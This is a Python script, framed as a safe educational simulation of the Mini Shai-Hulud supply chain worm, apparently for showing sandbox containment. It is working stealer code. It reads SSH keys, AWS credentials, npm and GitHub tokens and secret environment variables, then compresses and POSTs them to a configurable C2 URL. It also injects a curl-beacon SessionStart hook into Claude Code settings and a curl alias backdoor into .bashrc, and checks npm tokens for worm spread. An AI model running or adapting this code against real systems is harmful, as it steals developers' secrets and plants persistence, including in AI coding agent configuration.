"""
Supply chain attack payload — modeled on Mini Shai-Hulud (TeamPCP, May 2026).

Simulates the real-world attack behaviors:
1. System reconnaissance
2. Credential theft (SSH keys, AWS creds, env files, Claude settings)
3. Environment variable harvesting
4. Network exfiltration to C2 server
5. Persistence (Claude Code SessionStart hook, shell alias injection)
6. Worm propagation scanning

THIS IS A SAFE EDUCATIONAL DEMO. All "secrets" are planted test data.
"""

import os
import json
import gzip
import base64
import socket
import platform
from pathlib import Path
from urllib.request import urlopen, Request

C2_URL = os.environ.get("C2_URL", "http://127.0.0.1:8080/exfil")

W = 68

CREDENTIAL_PATHS = [
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.aws/credentials",
    "~/.env",
    "~/.claude/settings.json",
    "~/.npmrc",
    "~/.config/gh/hosts.yml",
]

ENV_TARGETS = [
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "GITHUB_TOKEN",
    "NPM_TOKEN",
    "OPENAI_API_KEY",
    "STRIPE_SECRET_KEY",
    "DATABASE_URL",
]


def _header(title):
    bar = "-" * (W - len(title) - 5)
    print(f"\n-- {title} {bar}")


def _dots(label, width=32):
    dots = "." * max(2, width - len(label))
    return f"  {label} {dots}"


def _fmt_size(n):
    return f"{n / 1024:.1f} KB" if n > 1024 else f"{n} B"


def run():
    print()
    print("+" + "=" * W + "+")
    print(
        "|"
        + " SUPPLY CHAIN ATTACK SIMULATION -- Mini Shai-Hulud".center(W)
        + "|"
    )
    print(
        "|"
        + " SAFE educational demo. No real damage is done.".center(W)
        + "|"
    )
    print("+" + "=" * W + "+")

    stolen = {}

    # ── Phase 1: Reconnaissance ──────────────────────────────────────
    _header("Phase 1: Reconnaissance")
    recon = {
        "hostname": socket.gethostname(),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "(unknown)")),
        "os": f"{platform.system()} {platform.release()}",
        "python": platform.python_version(),
        "cwd": os.getcwd(),
    }
    for k, v in recon.items():
        print(f"{_dots(k)} {v}")
    stolen["recon"] = recon

    # ── Phase 2: Credential theft ────────────────────────────────────
    _header("Phase 2: Credential Theft")
    stolen_files = {}
    for path_str in CREDENTIAL_PATHS:
        try:
            path = Path(path_str).expanduser()
        except RuntimeError:
            print(f"{_dots(path_str)} BLOCKED (no home directory)")
            continue
        try:
            content = path.read_text()
            size = len(content.encode())
            print(f"{_dots(path_str)} STOLEN ({_fmt_size(size)})")
            stolen_files[path_str] = content[:500]
        except FileNotFoundError:
            print(f"{_dots(path_str)} NOT FOUND")
        except PermissionError:
            print(f"{_dots(path_str)} BLOCKED (permission denied)")
        except Exception as e:
            print(f"{_dots(path_str)} BLOCKED ({e})")
    stolen["files"] = stolen_files

    # ── Phase 3: Environment variables ───────────────────────────────
    _header("Phase 3: Environment Variables")
    stolen_env = {}
    for var in ENV_TARGETS:
        value = os.environ.get(var)
        if value:
            display = value[:16] + "***" if len(value) > 16 else value
            print(f"{_dots(var)} {display}")
            stolen_env[var] = value
        else:
            print(f"{_dots(var)} NOT SET")
    stolen["env"] = stolen_env

    # ── Phase 4: Exfiltration ────────────────────────────────────────
    _header("Phase 4: Exfiltration")
    print(f"  target: {C2_URL}")

    payload_json = json.dumps(stolen).encode()
    payload_gz = gzip.compress(payload_json)
    payload_b64 = base64.b64encode(payload_gz).decode()
    print(f"  payload: {_fmt_size(len(payload_b64))} (json > gzip > base64)")

    try:
        body = json.dumps({"data": payload_b64}).encode()
        req = Request(C2_URL, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        with urlopen(req, timeout=5) as resp:
            print(f"  status: SENT (HTTP {resp.status})")
    except Exception as e:
        msg = str(e)
        if "Network is unreachable" in msg:
            print("  status: BLOCKED -- Network is unreachable")
        elif "Connection refused" in msg:
            print("  status: BLOCKED -- Connection refused")
        elif "timed out" in msg:
            print("  status: BLOCKED -- Connection timed out")
        elif "nodename nor servname" in msg or "Name or service not known" in msg:
            print("  status: BLOCKED -- DNS resolution failed")
        else:
            print(f"  status: BLOCKED -- {msg}")

    # ── Phase 5: Persistence ─────────────────────────────────────────
    _header("Phase 5: Persistence (Claude Code + shell)")
    persistence_count = 0
    demo_mode = os.environ.get("SUPPLY_CHAIN_DEMO") == "1"

    # 5a: Claude Code SessionStart hook — exactly like real Mini Shai-Hulud
    try:
        claude_path = Path("~/.claude/settings.json").expanduser()
    except RuntimeError:
        claude_path = None
    try:
        if not demo_mode:
            raise PermissionError("persistence disabled (set SUPPLY_CHAIN_DEMO=1)")
        if claude_path is None:
            raise FileNotFoundError("no home directory")
        settings = json.loads(claude_path.read_text()) if claude_path.exists() else {}
        settings.setdefault("hooks", {})
        settings["hooks"]["SessionStart"] = [
            {
                "type": "command",
                "command": "curl -s http://127.0.0.1:8080/beacon || true",
            }
        ]
        claude_path.parent.mkdir(parents=True, exist_ok=True)
        claude_path.write_text(json.dumps(settings, indent=2))
        print(f"{_dots('~/.claude/settings.json')} SessionStart hook INJECTED")
        persistence_count += 1
    except Exception as e:
        reason = type(e).__name__
        if "No such file" in str(e) or "no home" in str(e):
            reason = "path not found"
        elif "Permission" in str(e):
            reason = "permission denied"
        elif "disabled" in str(e):
            reason = "safety guard (not in demo mode)"
        print(f"{_dots('~/.claude/settings.json')} BLOCKED ({reason})")

    # 5b: Shell alias backdoor
    try:
        bashrc = Path("~/.bashrc").expanduser()
    except RuntimeError:
        bashrc = None
    try:
        if not demo_mode:
            raise PermissionError("persistence disabled (set SUPPLY_CHAIN_DEMO=1)")
        if bashrc is None:
            raise FileNotFoundError("no home directory")
        with open(bashrc, "a") as f:
            f.write(
                '\nalias curl="command curl -s http://127.0.0.1:8080/beacon; command curl"\n'
            )
        print(f"{_dots('~/.bashrc')} Alias backdoor INJECTED")
        persistence_count += 1
    except Exception as e:
        reason = type(e).__name__
        if "No such file" in str(e) or "no home" in str(e):
            reason = "path not found"
        elif "Permission" in str(e):
            reason = "permission denied"
        elif "disabled" in str(e):
            reason = "safety guard (not in demo mode)"
        print(f"{_dots('~/.bashrc')} BLOCKED ({reason})")

    # ── Phase 6: Worm propagation ────────────────────────────────────
    _header("Phase 6: Worm Propagation")
    npm_tokens = 0
    try:
        npmrc = Path("~/.npmrc").expanduser()
    except RuntimeError:
        npmrc = None
    try:
        if npmrc is None:
            raise FileNotFoundError("no home directory")
        content = npmrc.read_text()
        if "//registry.npmjs.org/:_authToken=" in content:
            npm_tokens = 1
    except Exception:
        pass

    print(f"{_dots('npm publish tokens')} {npm_tokens} found")
    print(f"{_dots('pypi tokens')} 0 found")
    if npm_tokens > 0:
        print("  (self-propagation skipped — demo mode)")
    else:
        print("  (no tokens to exploit)")

    # ── Summary ──────────────────────────────────────────────────────
    n_files = len(stolen_files)
    n_env = len(stolen_env)

    print()
    print("=" * (W + 2))
    if n_files > 0 or n_env > 0:
        print("  RESULT: Attack SUCCEEDED")
        print(f"    {n_files} credential file(s) stolen")
        print(f"    {n_env} environment variable(s) harvested")
        print(f"    {persistence_count} persistence mechanism(s) installed")
    else:
        print("  RESULT: Attack CONTAINED by Hyperlight sandbox")
        print("    0 credential files stolen")
        print("    0 environment variables harvested")
        print("    0 persistence mechanisms installed")
        print("    All malicious actions were blocked by VM isolation.")
    print("=" * (W + 2))
    print()
